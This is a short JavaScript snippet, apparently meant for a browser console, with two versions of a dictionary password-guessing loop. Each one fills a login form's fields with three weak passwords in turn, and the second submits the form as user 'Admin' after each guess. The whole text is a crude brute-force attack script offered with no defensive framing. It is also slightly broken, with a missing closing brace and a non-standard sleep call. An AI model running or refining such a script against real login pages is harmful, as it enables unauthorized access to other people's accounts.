let diccionario = ['1234','1234567','123456789']

for (i = 0; i < diccionario.length; i++) {
  
  document.getElementById('username').value = "s";
  document.getElementById('password').value = diccionario[i];
  sleep(3000);
}

==================================================================

  let diccionario = ['1234','1234567','123456789']

for (i = 0; i < diccionario.length; i++) {
  
  document.Login.Username.value = 'Admin';
  document.Login.Password.value = diccionario[i];
  document.Login.Submit.value   = 'Login';document.Login.submit();
  sleep(3000);
